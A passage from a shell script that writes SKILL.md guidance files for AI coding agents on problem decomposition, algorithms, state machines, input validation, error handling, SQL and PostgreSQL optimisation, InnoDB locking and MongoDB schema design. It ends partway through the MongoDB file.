Application: The AI wraps the HTTP client in a circuit breaker that trips to Open after 5 consecutive 5xx errors, applies a 2-second timeout per attempt, retries idempotent status checks using full jitter backoff, and fails fast with a cached fallback when the circuit is Open.
EOF

cat << 'EOF' > skills/logic/problem-solving/complex-domain-decomposition/SKILL.md
---
name: "complex-domain-decomposition"
description: "Deconstructing ambiguous, multi-variable domain requirements into atomic, verifiable sub-problems, explicit invariants, and dependency DAGs."
category: "logic"
subcategory: "problem-solving"
language: "agnostic"
framework: "none"
technology: "engineering-analysis"
difficulty: "advanced"
tags: ["logic", "problem-solving", "decomposition", "dag", "invariants", "requirements"]
---

# Complex Problem Decomposition and Boundary Discovery

## Purpose
Provide AI agents with a rigorous framework for breaking down sprawling, underspecified engineering tasks into atomic, deterministic sub-tasks with clear dependency order.

## When to Use
Use before writing code on complex features, distributed workflows, multi-step migration pipelines, or ambiguous user stories.

## Inputs / Context
High-level feature request, domain constraints, actor permissions, system interactions, and target outcomes.

## Instructions
1. Identify and list all Domain Entities and their core attributes.
2. Establish Domain Invariants: immutable conditions that must always remain true before and after any state transition (e.g., 'An invoice total cannot be less than zero').
3. Decompose the overarching problem into atomic, independently testable sub-problems.
4. Construct a Directed Acyclic Graph (DAG) of dependencies: sequence sub-problems so that prerequisite data models and interfaces are established before dependent features.
5. Identify all external boundaries and integration points (APIs, storage, third-party services) and define explicit boundary contracts.
6. Enumerate non-functional requirements: latency budgets, consistency requirements, concurrency limits, and data volume expectations.
7. Explicitly flag ambiguous requirements and document the technical assumptions made to resolve them.

## Constraints / Rules
- Never begin coding while core domain invariants remain ambiguous or contradictory.
- Avoid introducing circular dependencies between sub-problems.
- Do not make architectural assumptions without validating data volume and SLA requirements.

## Workflow
1. Parse raw requirement text and extract nouns (entities) and verbs (operations).
2. Formulate explicit mathematical or logical invariant assertions.
3. Map steps into a DAG with inputs, outputs, and side-effects.
4. Determine failure modes for each node in the DAG.
5. Produce a phased implementation roadmap.

## Expected Output
Structured technical specification featuring an Invariants List, Dependency DAG, Data Flow Diagrams, and Step-by-Step Execution Plan.

## Validation Checklist
- [ ] Are all domain invariants explicitly defined and verifiable?
- [ ] Is the dependency DAG free of circular loops?
- [ ] Are edge cases and ambiguous requirements documented with working assumptions?
- [ ] Is every decomposed sub-problem independently testable?
- [ ] Are external integration boundaries protected by explicit contracts?

## Common Mistakes & Antipatterns
- Jumping straight into database schema or UI design before clarifying domain invariants.
- Assuming an ideal happy-path workflow while ignoring data synchronization and partial failure states.
- Creating monolithic tasks that cannot be verified in isolation.

## Concrete Real-World Example
Scenario: Designing an automated subscription upgrade/downgrade billing engine with prorated credits.
Prompt: Decompose this subscription proration billing problem into atomic engineering steps.
Application: The AI defines invariants (credits cannot exceed bill, billing cycles align to UTC midnight), structures sub-problems into a DAG (Calculate Used Days -> Calculate Credit -> Apply to Next Invoice -> Charge Difference), and defines testable unit contracts for each step.
EOF

cat << 'EOF' > skills/logic/algorithms/time-space-complexity-optimization/SKILL.md
---
name: "time-space-complexity-optimization"
description: "Analyzing computational complexity, selecting optimal data structures, eliminating quadratic bottlenecks, and evaluating trade-offs between memory and CPU."
category: "logic"
subcategory: "algorithms"
language: "agnostic"
framework: "none"
technology: "computer-science"
difficulty: "advanced"
tags: ["logic", "algorithms", "big-o", "complexity", "data-structures", "optimization"]
---

# Algorithm Selection and Time-Space Complexity Optimization

## Purpose
Guide AI in evaluating algorithmic efficiency, selecting appropriate data structures (HashMaps, Heaps, Tries, Graphs), and optimizing Big-O time and space complexity.

## When to Use
Use when reviewing slow data processing algorithms, optimizing nested search loops, handling large collections, or processing real-time telemetry.

## Inputs / Context
Existing algorithm implementation, input data distribution (size, frequency, ordering), memory constraints, and target execution budget.

## Instructions
1. Determine the Big-O Time Complexity (worst, average, and amortized) and Space Complexity of the current algorithm.
2. Identify quadratic (O(n²)) or exponential (O(2ⁿ)) bottlenecks, particularly nested loops over dynamic collections.
3. Select optimal data structures to reduce lookup times from O(n) to O(1) using HashMaps or HashSet indexing.
4. Use Min/Max Heaps (Priority Queues) for streaming Top-K problems to reduce complexity from O(n log n) sorting to O(n log k).
5. Leverage Prefix Trees (Tries) for fast prefix searching and auto-completion over dictionary sets.
6. Evaluate space-time trade-offs: consider memoization, precomputed lookup tables, or bloom filters when memory is abundant; choose in-place algorithms (two pointers, sliding window) when memory is constrained.
7. Account for real-world hardware factors: cache locality, memory fragmentation, and constant factors.

## Constraints / Rules
- Never sacrifice algorithmic correctness or readability for trivial constant-factor micro-optimizations.
- Avoid using recursive solutions without depth limits or tail-call optimization on unbounded inputs, risking stack overflow.

## Workflow
1. Profile the algorithm to locate the critical computational loop.
2. Formulate the mathematical recurrence relation and Big-O notation.
3. Replace linear scans with indexed data structures or two-pointer techniques.
4. Benchmark both versions using realistic sample sizes (1K, 10K, 100K items).
5. Document time and space complexity in function docstrings.

## Expected Output
Optimized algorithm code with verified Big-O time/space complexity analysis and comparative benchmark rationale.

## Validation Checklist
- [ ] Has quadratic or cubic complexity been reduced to linear or linearithmic where possible?
- [ ] Is memory consumption bounded and within system limits?
- [ ] Are edge cases (empty collection, single item, all duplicate items) tested?
- [ ] Is Big-O complexity explicitly documented in the code?
- [ ] Does the implementation prevent stack overflow on deep recursion?

## Common Mistakes & Antipatterns
- Calling `array.includes()` or `list.contains()` inside a loop over another array, unwittingly creating an O(n*m) quadratic algorithm.
- Sorting an entire 1,000,000-element array simply to find the top 5 elements, instead of using a bounded heap.
- Applying premature micro-optimizations that obscure code logic without altering asymptotic complexity.

## Concrete Real-World Example
Scenario: An API endpoint times out because it compares two user permission lists (each with 50,000 entries) using nested `for` loops to find differences.
Prompt: Optimize this permission diff algorithm to execute within 20 milliseconds.
Application: The AI converts the comparison list into a `Set` (O(m) preparation), iterates through the first list with O(1) set lookups, reducing total time complexity from O(n*m) to O(n+m), reducing execution time from 12 seconds to 15ms.
EOF

cat << 'EOF' > skills/logic/state-management/finite-state-machine-design/SKILL.md
---
name: "finite-state-machine-design"
description: "Designing deterministic Finite State Machines (FSM) and hierarchical statecharts to eliminate impossible states, unhandled edge transitions, and boolean flag explosion."
category: "logic"
subcategory: "state-management"
language: "typescript"
framework: "none"
technology: "state-machines"
difficulty: "intermediate"
tags: ["logic", "state-machine", "fsm", "statecharts", "determinism", "transitions"]
---

# Finite State Machine and Statechart Modeling

## Purpose
Instruct AI agents to model complex component and workflow lifecycles using explicit states, events, and transition tables rather than ad-hoc boolean flags.

## When to Use
Use when modeling multi-step workflows (checkout, order fulfillment, video playback, connection status) or components with interdependent visual states.

## Inputs / Context
List of valid states, allowed triggering events, side effects, and error conditions.

## Instructions
1. Replace collections of interdependent boolean flags (`isLoading`, `hasError`, `isSuccess`, `isSubmitting`) with a single, explicit discrete state enum.
2. Define a state transition matrix or object mapping `(Current State, Event) -> Next State`.
3. Guard against invalid transitions: any event received in a state that does not explicitly allow it must either throw an error or be safely ignored (no-op).
4. Isolate Side Effects (actions executed on entering/exiting a state) from state transition evaluation.
5. Use Hierarchical State Machines (Statecharts) for complex workflows where sub-states share parent event handlers.
6. Make states serializable to facilitate debugging, session restoration, and time-travel inspection.
7. Provide visual transition diagrams or markdown tables documenting all valid transitions.

## Constraints / Rules
- Never allow state transitions to bypass the transition handler or mutate state directly.
- Avoid defining generic 'catch-all' transitions that obscure unintended state leaps.
- Do not execute asynchronous side-effects inside pure state transition reducers.

## Workflow
1. List all valid states and all triggering events.
2. Build a State Transition Table mapping states to events and next states.
3. Implement the state machine as a pure function / reducer `(state, event) => nextState`.
4. Attach side effect hooks to state entry/exit lifecycle points.
5. Write exhaustive unit tests verifying that all invalid transitions are rejected.

## Expected Output
Deterministic state machine implementation with typed states, events, pure transition reducer, and transition validation.

## Validation Checklist
- [ ] Are all possible states enumerated in a discrete union or enum?
- [ ] Is it impossible to represent conflicting states simultaneously?
- [ ] Are invalid state transitions safely rejected?
- [ ] Are side-effects strictly decoupled from the pure transition calculation?
- [ ] Are all transition paths documented in a transition table?

## Common Mistakes & Antipatterns
- Using 5 independent booleans (`isFetching`, `isSaving`, `isError`, `isLocked`, `isDirty`), resulting in 32 possible states, most of which are nonsensical bugs.
- Triggering side-effects (like network calls) directly inside the state transition logic.
- Allowing components to transition backwards without an explicit reset event.

## Concrete Real-World Example
Scenario: An order checkout UI frequently gets stuck because a user double-clicking 'Submit' triggers simultaneous charging and error states.
Prompt: Convert this checkout logic into a Finite State Machine that prevents double-submission.
Application: The AI defines states (`IDLE`, `VALIDATING`, `SUBMITTING`, `PAID`, `FAILED`), accepts `SUBMIT` only when in `IDLE`, transitions to `SUBMITTING` immediately (ignoring duplicate clicks), and triggers payment side-effects upon state entry.
EOF

cat << 'EOF' > skills/logic/validation/declarative-schema-validation/SKILL.md
---
name: "declarative-schema-validation"
description: "Constructing robust, declarative validation pipelines at application boundaries using schema validators (Zod, Pydantic, Joi) with custom transformations and error formatting."
category: "logic"
subcategory: "validation"
language: "typescript"
framework: "none"
technology: "zod"
difficulty: "intermediate"
tags: ["logic", "validation", "schemas", "zod", "sanitization", "runtime-safety"]
---

# Declarative Runtime Schema Validation and Sanitization

## Purpose
Provide concrete patterns for strictly validating and sanitizing untrusted incoming data (HTTP requests, files, environment variables, webhooks) before it reaches application business logic.

## When to Use
Use at all system entrypoints: API route handlers, form submission processors, environment variable loaders, and inter-service messaging queues.

## Inputs / Context
Data schemas, business validation rules, sanitization requirements (trimming, stripping HTML), and error reporting formats.

## Instructions
1. Validate all external inputs at the system perimeter before any business logic executes; treat all external data as untrusted `unknown`.
2. Use declarative runtime schema libraries (such as Zod for TypeScript or Pydantic for Python) rather than manual imperative `if/else` checks.
3. Infer static types directly from runtime schemas (`type User = z.infer<typeof UserSchema>`) to guarantee single-source-of-truth type parity.
4. Apply sanitization transformations within the schema parsing pipeline (e.g., `.trim()`, `.toLowerCase()`, stripping disallowed characters).
5. Chain refined custom validations (`.refine()`) for cross-field business invariants (e.g., `endDate >= startDate`).
6. Format validation failure errors into standardized structures mapping field paths to user-friendly error messages (avoid leaking raw schema internals).
7. Strip unknown properties (`.strip()`) to prevent mass assignment vulnerabilities, or reject them (`.strict()`) where strict adherence is required.

## Constraints / Rules
- Never trust client-side validation alone; always enforce identical or stricter validation on the backend.
- Never use `as Type` casting on raw unvalidated input; always use `.parse()` or `.safeParse()`.
- Do not expose sensitive internal property paths in public validation error messages.

## Workflow
1. Define schema specifying types, lengths, regex patterns, and optionality.
2. Attach normalization transformations (trimming, type coercion).
3. Add multi-field refinement rules for business constraints.
4. Parse input safely using `.safeParse()` and handle failure branch.
5. Test against malicious payloads (SQL injection strings, oversized payloads, type mismatch).

## Expected Output
Reusable declarative schema definition, inferred TypeScript types, and validation middleware with structured error responses.

## Validation Checklist
- [ ] Are inputs verified at the perimeter before reaching service layers?
- [ ] Are static types inferred directly from the schema without duplication?
- [ ] Are multi-field dependencies (e.g., password confirmation) validated?
- [ ] Are unexpected fields stripped or rejected to prevent mass-assignment?
- [ ] Are validation error messages user-friendly and actionable?

## Common Mistakes & Antipatterns
- Writing dozens of manual `if (!req.body.name || typeof req.body.name !== 'string')` checks that miss null, undefined, or empty-string edge cases.
- Duplicating TypeScript interfaces and validation functions separately, causing them to drift out of sync.
- Casting unvalidated JSON payloads with `const data = JSON.parse(str) as UserProfile`.

## Concrete Real-World Example
Scenario: An API registration endpoint allows users to submit empty strings for passwords and crashes when an unexpected property is passed.
Prompt: Build a strict validation schema for a user registration endpoint using Zod.
Application: The AI creates `RegistrationSchema` with trimmed strings, email format, minimum 12-character password complexity, cross-field password confirmation refinement, strips unknown keys, and returns a 422 Problem Details response on validation failure.
EOF

cat << 'EOF' > skills/logic/error-handling/exhaustive-failure-modes/SKILL.md
---
name: "exhaustive-failure-modes"
description: "Taxonomizing domain failure modes, distinguishing transient from permanent errors, modeling typed error hierarchies, and ensuring exhaustive compiler verification."
category: "logic"
subcategory: "error-handling"
language: "typescript"
framework: "none"
technology: "error-handling"
difficulty: "intermediate"
tags: ["logic", "error-handling", "failure-modes", "domain-errors", "exhaustiveness"]
---

# Exhaustive Error Modeling and Failure Mode Taxonomy

## Purpose
Guide AI in structuring comprehensive error taxonomies that classify failures accurately, provide actionable operational context, and ensure all error branches are handled.

## When to Use
Use when designing domain services, API clients, distributed workflows, or refactoring generic try/catch blocks.

## Inputs / Context
Domain operations, potential external failure points (network, storage, auth, rate limit), and user impact.

## Instructions
1. Classify all errors into three operational categories:
   - Domain Errors: Expected business rule violations (e.g., `InsufficientFundsError`).
   - Technical/Transient Errors: Recoverable operational failures (e.g., `DatabaseTimeoutError`, `RateLimitExceededError`).
   - Fatal/Bug Errors: Unrecoverable software defects or invariant violations (e.g., `NullPointerError`, `CorruptedStateError`).
2. Model domain errors as distinct, typed classes inheriting from a base `AppError`.
3. Include structured context on every error instance: error code, timestamp, entity ID, correlation ID, and whether the error is retryable.
4. Ensure exhaustive handling of union error types in TypeScript using the `never` type pattern in `switch/case` default blocks.
5. Never catch errors without taking concrete action: log with context, translate to a higher-level domain error, retry, or re-throw.
6. Mask internal technical details in public-facing errors while preserving full diagnostic traces in internal application logs.

## Constraints / Rules
- Never write empty catch blocks (`catch (e) {}`).
- Never throw generic strings or plain object literals (`throw 'error'`); always throw instances of `Error`.
- Avoid catching top-level fatal exceptions simply to return a fake fallback without logging.

## Workflow
1. Catalog all potential failure scenarios for the feature.
2. Define domain error class hierarchy with metadata properties.
3. Implement operation returning `Result<T, DomainError>` or throwing typed errors.
4. Add exhaustive pattern matching handler at the controller or UI boundary.
5. Verify compiler enforcement using `assertNever(x: never): never`.

## Expected Output
Strongly typed error class taxonomy with structured metadata, retryability flags, and exhaustive pattern-matching handlers.

## Validation Checklist
- [ ] Are errors categorized as domain, transient, or fatal?
- [ ] Do error classes include machine-readable error codes?
- [ ] Is exhaustive pattern matching enforced by the compiler?
- [ ] Are internal stack traces excluded from client responses?
- [ ] Are all caught errors logged or translated with context preserved?

## Common Mistakes & Antipatterns
- Catching all errors and returning HTTP 500, obscuring client validation issues (400) or missing resources (404).
- Throwing raw strings (`throw "Invalid email"`), losing stack trace information and error prototype chains.
- Catching an error, logging it, and then rethrowing it at multiple intermediate layers, flooding logs with duplicate entries.

## Concrete Real-World Example
Scenario: A payment handler catches all exceptions with `catch (e) { return "failed"; }`, making it impossible for the caller to know whether to retry (network timeout) or prompt the user for a new card (insufficient funds).
Prompt: Create a typed error taxonomy and handler for this payment gateway integration.
Application: The AI creates `PaymentDeclinedError` (permanent), `GatewayTimeoutError` (transient, retryable = true), and `InvalidCardDataError`, implements a handler that retries timeouts with backoff, and maps domain errors to precise client responses.
EOF

cat << 'EOF' > skills/logic/business-logic/pure-domain-rules-isolation/SKILL.md
---
name: "pure-domain-rules-isolation"
description: "Isolating complex business logic and business rules into deterministic, pure functions with zero side-effects following the Functional Core, Imperative Shell pattern."
category: "logic"
subcategory: "business-logic"
language: "agnostic"
framework: "none"
technology: "functional-programming"
difficulty: "advanced"
tags: ["logic", "business-logic", "pure-functions", "functional-core", "domain-rules", "determinism"]
---

# Pure Domain Rules Isolation and Functional Core Architecture

## Purpose
Instruct AI agents to author mission-critical domain logic as pure, side-effect-free functions that can be tested instantaneously with 100% test coverage without mocking frameworks.

## When to Use
Use when developing pricing calculators, tax engines, loan qualification algorithms, discount rules, or core workflow validation rules.

## Inputs / Context
Business rules specification, policy documents, input parameters, and expected deterministic outputs.

## Instructions
1. Adopt the 'Functional Core, Imperative Shell' architectural pattern:
   - Functional Core: Contains all business decisions, rules, and mathematical calculations in pure functions. Given the same inputs, it always returns the exact same output. No I/O, no DB queries, no network calls, no current timestamp lookups.
   - Imperative Shell: Orchestrates side-effects (reads database, queries current time, passes data into the Core, receives decisions, writes back to database or triggers alerts).
2. Pass all external variables (such as the current system time `currentTime: Date` or random seeds) explicitly as function arguments rather than calling `new Date()` or `Math.random()` inside the business rule.
3. Treat all domain inputs as immutable; return brand new data structures rather than mutating passed arguments.
4. Model business policies as composable rule pipelines where individual rules can be added, reordered, or disabled cleanly.
5. Express complex decision logic using decision tables or algebraic data types rather than nested multi-level `if/else` ladders.
6. Write property-based tests (fuzzing) verifying that domain rules hold across millions of randomized valid input combinations.

## Constraints / Rules
- Never perform I/O (file read/write, DB query, HTTP request) inside the Functional Core.
- Never use non-deterministic functions (`Date.now()`, `crypto.randomUUID()`) inside pure domain rules.
- Do not mutate input collections or entity state in place.

## Workflow
1. Identify business rules and separate calculations from data retrieval.
2. Formulate pure domain functions accepting all required state as explicit arguments.
3. Write pure calculation logic returning typed decision objects.
4. Implement the outer shell to fetch data, invoke the pure core, and commit side-effects.
5. Author comprehensive unit tests covering 100% of decision branches with zero mocks.

## Expected Output
Side-effect-free, deterministic domain logic functions paired with an outer orchestration service, tested without mocking frameworks.

## Validation Checklist
- [ ] Are domain functions 100% pure (deterministic and side-effect free)?
- [ ] Are timestamps and random seeds passed explicitly as arguments?
- [ ] Can domain rules be tested completely in memory without mocking databases or APIs?
- [ ] Are input parameters treated as immutable?
- [ ] Are complex rule sets modeled as composable functions or decision tables?

## Common Mistakes & Antipatterns
- Interleaving database queries directly inside tax calculation loops, making testing slow and requiring extensive mocking.
- Calling `new Date()` inside an interest calculation function, making it impossible to write deterministic tests for past or future dates.
- Mutating cart item prices directly in place, causing unpredictable side-effects across concurrent calculations.

## Concrete Real-World Example
Scenario: An insurance premium calculation engine is entangled with database calls, making it slow to run and impossible to test without spinning up Postgres and Redis.
Prompt: Decouple the insurance risk calculation rules into a pure functional core.
Application: The AI extracts all actuarial formulas into pure functions accepting an immutable `ApplicantProfile` and `PolicyRules` configuration, returning a `RiskAssessment` object, while moving database persistence to an outer orchestration service.
EOF

cat << 'EOF' > skills/database/sql/declarative-query-optimization/SKILL.md
---
name: "declarative-query-optimization"
description: "Optimizing relational SQL queries by replacing procedural loops with set-based operations, leveraging window functions, Common Table Expressions (CTEs), and eliminating Cartesian products."
category: "database"
subcategory: "sql"
language: "sql"
framework: "none"
technology: "ansi-sql"
difficulty: "intermediate"
tags: ["database", "sql", "query-optimization", "window-functions", "cte", "set-based"]
---

# Declarative SQL Query Optimization and Set-Based Logic

## Purpose
Direct AI models to write performant, declarative SQL queries that utilize the database engine's set-based relational optimizer rather than procedural row-by-row logic.

## When to Use
Use when writing complex database reports, analytic queries, batch updates, or optimizing slow-running queries.

## Inputs / Context
Database schema, table cardinality, query requirements, and existing execution performance.

## Instructions
1. Think in sets, not rows: eliminate procedural cursors, `WHILE` loops, and repeated single-row queries in favor of declarative set-based queries (`JOIN`, `UNION ALL`, `CASE WHEN`).
2. Utilize Window Functions (`ROW_NUMBER()`, `RANK()`, `LEAD()`, `LAG()`, `SUM(...) OVER (...)`) for ranking and running totals instead of self-joins or correlated subqueries.
3. Structure complex multi-step queries using readable Common Table Expressions (`WITH cte AS (...)`) rather than deeply nested derived tables.
4. Select only needed columns explicitly (`SELECT id, name, created_at`); avoid `SELECT *` which wastes network I/O, prevents index-only scans, and breaks caching.
5. Avoid non-sargable expressions in `WHERE` clauses (e.g., `WHERE YEAR(created_at) = 2024` prevents index usage; use `WHERE created_at >= '2024-01-01' AND created_at < '2025-01-01'` instead).
6. Replace `UNION` with `UNION ALL` when duplicate elimination is not strictly required, avoiding expensive sorting operations.
7. Use `EXISTS` instead of `IN` when testing for presence against subqueries with large result sets.

## Constraints / Rules
- Never use `SELECT *` in production application code.
- Avoid using correlated subqueries in the `SELECT` projection list for large record sets.
- Do not apply functions or string manipulation to indexed columns in `WHERE` or `ON` clauses.

## Workflow
1. Formulate query using declarative joins and filter predicates.
2. Replace correlated subqueries with window functions or CTEs.
3. Ensure all filter predicates are sargable (index-seek compatible).
4. Restrict projection to required columns.
5. Analyze query execution plan (`EXPLAIN ANALYZE`).

## Expected Output
High-performance ANSI-SQL query utilizing set-based operations, window functions, and sargable predicates.

## Validation Checklist
- [ ] Are all filter predicates in `WHERE` clauses sargable?
- [ ] Is `SELECT *` eliminated in favor of explicit column lists?
- [ ] Are window functions used instead of expensive self-joins?
- [ ] Is `UNION ALL` preferred over `UNION` where duplicates are impossible or acceptable?
- [ ] Does `EXPLAIN` confirm the absence of full table scans on large tables?

## Common Mistakes & Antipatterns
- Wrapping indexed date columns in functions like `WHERE DATE(order_date) = '2024-05-01'`, forcing the engine to scan every single row in the table.
- Using `SELECT *` across joined tables with dozens of unused columns, exhausting network bandwidth and database memory.
- Using procedural cursors to iterate over rows and perform updates one by one instead of a single set-based `UPDATE ... FROM`.

## Concrete Real-World Example
Scenario: An analytics query calculates each user's latest transaction using a correlated subquery that scans a 10-million row table for every single customer.
Prompt: Optimize this customer latest transaction query to run in under 200ms.
Application: The AI rewrites the query using `ROW_NUMBER() OVER (PARTITION BY customer_id ORDER BY transaction_date DESC)` inside a CTE, filtering for `WHERE rn = 1`, reducing query execution time from 45 seconds to 120 milliseconds.
EOF

cat << 'EOF' > skills/database/postgresql/indexing-and-execution-plans/SKILL.md
---
name: "indexing-and-execution-plans"
description: "Designing optimal PostgreSQL index strategies (B-Tree, GIN, BRIN, Partial, Covering) and diagnosing execution bottlenecks using EXPLAIN (ANALYZE, BUFFERS)."
category: "database"
subcategory: "postgresql"
language: "sql"
framework: "none"
technology: "postgresql"
difficulty: "advanced"
tags: ["database", "postgresql", "indexing", "explain-analyze", "gin", "brin", "performance"]
---

# PostgreSQL Indexing Architecture and EXPLAIN Plan Analysis

## Purpose
Provide AI agents with deep PostgreSQL optimization capabilities to inspect query execution plans, diagnose buffer cache hits, and design targeted indexing strategies.

## When to Use
Use when optimizing slow PostgreSQL queries, indexing JSONB or full-text data, scaling append-only time-series tables, or resolving sequential scan bottlenecks.

## Inputs / Context
Query SQL, table schema, volume/cardinality metrics, and `EXPLAIN (ANALYZE, BUFFERS)` output.

## Instructions
1. Run and evaluate queries using `EXPLAIN (ANALYZE, BUFFERS, COSTS, TIMING)`.
2. Inspect buffer statistics: compare `Buffers: shared hit` (memory cache) vs `Buffers: shared read` (disk I/O) to identify memory pressure and disk thrashing.
3. Identify plan node bottlenecks: Seq Scan on large tables, nested loops with unexpected row counts, expensive Hash/Sort operations spilling to disk (`WorkMem` exceeded).
4. Select the correct PostgreSQL index type:
   - B-Tree: Standard equality, ranges (`<`, `<=`, `=`, `>=`, `>`), and `ORDER BY`.
   - GIN (Generalized Inverted Index): Fast lookup within JSONB arrays, full-text search (`tsvector`), and multi-attribute array tags.
   - BRIN (Block Range Index): Extremely small, high-performance index for massive append-only tables naturally sorted by physical order (e.g., timestamps, auto-incrementing IDs).
   - GiST: Geometric, geospatial (PostGIS), and range types (`daterange`).
5. Use Partial Indexes (`CREATE INDEX ... WHERE active = true`) to index only relevant rows, reducing index size and write overhead.
6. Use Covering Indexes with `INCLUDE (col1, col2)` to enable Index-Only Scans, satisfying queries entirely from the index without reading the table heap.
7. Always create indexes concurrently in production (`CREATE INDEX CONCURRENTLY`) to prevent locking writes on live tables.

## Constraints / Rules
- Never run `CREATE INDEX` without `CONCURRENTLY` on a production table experiencing live traffic.
- Avoid over-indexing: each index incurs write overhead on `INSERT`, `UPDATE`, and `DELETE`.
- Do not create single-column B-Tree indexes on every column; analyze multi-column query patterns.

## Workflow
1. Execute query with `EXPLAIN (ANALYZE, BUFFERS)`.
2. Locate the node with the highest actual time or disk buffer read count.
3. Formulate the index design (composite order: equality columns first, followed by range columns).
4. Add `INCLUDE` columns if index-only scan is beneficial.
5. Create index with `CONCURRENTLY` and re-run `EXPLAIN (ANALYZE, BUFFERS)` to verify plan shift from Seq Scan to Index/Bitmap Scan.

## Expected Output
Optimized SQL query, `CREATE INDEX CONCURRENTLY` DDL statements, and before/after EXPLAIN plan performance comparison.

## Validation Checklist
- [ ] Does `EXPLAIN ANALYZE` confirm an Index Scan or Bitmap Index Scan?
- [ ] Is disk spill avoided during sorting (`Sort Method: quicksort` within `work_mem`)?
- [ ] Are partial indexes used where filtering on a boolean or status enum?
- [ ] Is `CREATE INDEX CONCURRENTLY` specified for migration scripts?
- [ ] Are multi-column indexes ordered with equality columns preceding range columns?

## Common Mistakes & Antipatterns
- Indexing composite columns in the wrong order: placing a range column before an equality column in a composite index, preventing the index from narrowing subsequent fields.
- Creating a standard B-Tree index on a JSONB column containing arrays, which fails to index individual elements (requires a GIN index).
- Forgetting to run `ANALYZE` after large data loads, causing the query planner to choose suboptimal plans based on stale table statistics.

## Concrete Real-World Example
Scenario: A customer query searching orders by `status = 'pending'` and `created_at > NOW() - INTERVAL '7 days'` does a full sequential scan over 20 million rows taking 8 seconds.
Prompt: Design a targeted PostgreSQL index to make this order query execute in under 10ms.
Application: The AI reviews the table stats, observes that 'pending' orders represent only 1% of the table, and creates a partial covering index: `CREATE INDEX CONCURRENTLY idx_orders_pending ON orders (created_at DESC) INCLUDE (customer_id, total) WHERE status = 'pending';`, resulting in an instant Index-Only Scan taking 2ms.
EOF

cat << 'EOF' > skills/database/mysql/concurrency-and-innodb-locking/SKILL.md
---
name: "concurrency-and-innodb-locking"
description: "Diagnosing and mitigating MySQL InnoDB row locks, gap locks, next-key locks, and deadlocks in high-concurrency transactional systems."
category: "database"
subcategory: "mysql"
language: "sql"
framework: "none"
technology: "mysql-innodb"
difficulty: "advanced"
tags: ["database", "mysql", "innodb", "locking", "deadlocks", "concurrency", "transactions"]
---

# MySQL InnoDB Concurrency, Locking, and Deadlock Mitigation

## Purpose
Provide concrete engineering procedures for designing MySQL transactions that minimize lock contention, prevent deadlocks, and operate reliably under high concurrent throughput.

## When to Use
Use when designing high-concurrency transactional write paths (inventory reservation, wallet balance transfers, booking engines) or debugging MySQL deadlocks.

## Inputs / Context
Table schemas with primary/foreign keys, transaction SQL statements, isolation levels, and `SHOW ENGINE INNODB STATUS` output.

## Instructions
1. Keep transaction execution times as short as possible: gather and validate all input data before opening a transaction; never execute external network calls inside a transaction.
2. Understand InnoDB locking mechanics:
   - Row Locks: Acquired on index records during `SELECT ... FOR UPDATE` or `UPDATE`.
   - Gap Locks: Acquired between index records to prevent phantom reads under `REPEATABLE READ`.
   - Next-Key Locks: A combination of a row lock and a gap lock on the gap preceding the record.
3. Access records in a deterministic order across all concurrent transactions (e.g., always lock row IDs in ascending order: `ORDER BY id ASC`) to eliminate circular wait conditions that cause deadlocks.
4. Ensure all `UPDATE` and `DELETE` statements utilize selective indexed columns in their `WHERE` clause; if an `UPDATE` does not match an index, InnoDB locks every row and gap in the entire table.
5. In high-concurrency read-heavy environments, consider switching transaction isolation from `REPEATABLE READ` to `READ COMMITTED` with row-based binary logging (`binlog_format=ROW`) to disable gap locks.
6. Inspect deadlocks using `SHOW ENGINE INNODB STATUS` and search for the `LATEST DETECTED DEADLOCK` section.
7. Implement application-level retry logic with jittered backoff for transactions failing with MySQL error 1213 (Deadlock found when trying to get lock).

## Constraints / Rules
- Never execute slow HTTP calls, email sending, or heavy file generation inside an active database transaction.
- Avoid updating large unindexed ranges within transactions.
- Never set `autocommit=0` globally; manage transactions explicitly using `START TRANSACTION` and `COMMIT`.

## Workflow
1. Extract deadlock traces from `SHOW ENGINE INNODB STATUS`.
2. Identify the competing transactions and the specific locks held and requested.
3. Order resource acquisition sequences across all application code paths.
4. Optimize index coverage on the locking queries.
5. Add automatic transaction retry wrappers in application code.

## Expected Output
Deadlock-free SQL transaction sequences, targeted indexing DDL, and application retry wrapper code.

## Validation Checklist
- [ ] Are multiple resources locked in consistent, deterministic order across all transactions?
- [ ] Are all `UPDATE` and `SELECT FOR UPDATE` queries backed by indexes?
- [ ] Are external network calls strictly excluded from active transactions?
- [ ] Are transactions kept minimal in duration?
- [ ] Is error 1213 handled with automated retry logic in the application layer?

## Common Mistakes & Antipatterns
- Updating rows without an index, causing InnoDB to lock the entire table and blocking all other concurrent writes.
- Two transactions locking rows in reverse order (Tx1 locks A then B; Tx2 locks B then A), causing an immediate deadlock.
- Performing long-running batch data migrations inside a single massive transaction instead of chunking into small batches of 1,000 rows.

## Concrete Real-World Example
Scenario: An inventory checkout endpoint deadlocks frequently when two customers attempt to purchase the same set of items at the same moment.
Prompt: Fix the deadlocks occurring during multi-item inventory reservations in MySQL InnoDB.
Application: The AI sorts the inventory item IDs in ascending numerical order in application memory before issuing `SELECT ... FOR UPDATE WHERE id IN (?) ORDER BY id ASC`, guaranteeing that all concurrent transactions acquire locks in identical sequence and eliminating circular wait deadlocks.
EOF

cat << 'EOF' > skills/database/mongodb/schema-design-and-aggregation/SKILL.md
---
name: "schema-design-and-aggregation"
description: "Architecting scalable MongoDB document schemas using embedding vs. referencing patterns, bucket patterns, compound indexes, and multi-stage aggregation pipelines."
category: "database"
subcategory: "mongodb"
language: "javascript"
framework: "none"
technology: "mongodb"
difficulty: "intermediate"
tags: ["database", "mongodb", "aggregation-pipeline", "schema-design", "document-db", "indexes"]
---

# MongoDB Schema Design Patterns and Aggregation Pipelines

## Purpose
Instruct AI agents to design high-performance MongoDB data models that balance document size limits, avoid unbounded arrays, and optimize multi-stage aggregation pipelines.

## When to Use
Use when modeling document data in MongoDB, building analytics aggregations, designing event logs, or refactoring relational schemas into document models.

## Inputs / Context
Application access patterns (read vs. write ratio), query shapes, data cardinality (1:1, 1:N, 1:Many, 1:Million), and document growth rates.

## Instructions
1. Model data based on application query access patterns rather than theoretical entity normalization.
2. Embedding vs. Referencing:
   - Embed: When child entities are always read with the parent, updated together, and have bounded cardinality (e.g., 1 to a few dozen addresses).
   - Reference: When child entities are read independently, updated frequently, or have unbounded cardinality (e.g., 1 to thousands of log entries).
3. Prevent the Unbounded Array antipattern: never allow an embedded array to grow indefinitely within a document; MongoDB has a strict 16MB document size limit.
4. Use the Bucket Pattern for time-series and IoT event data: group events into documents representing hourly or daily buckets with summary fields.
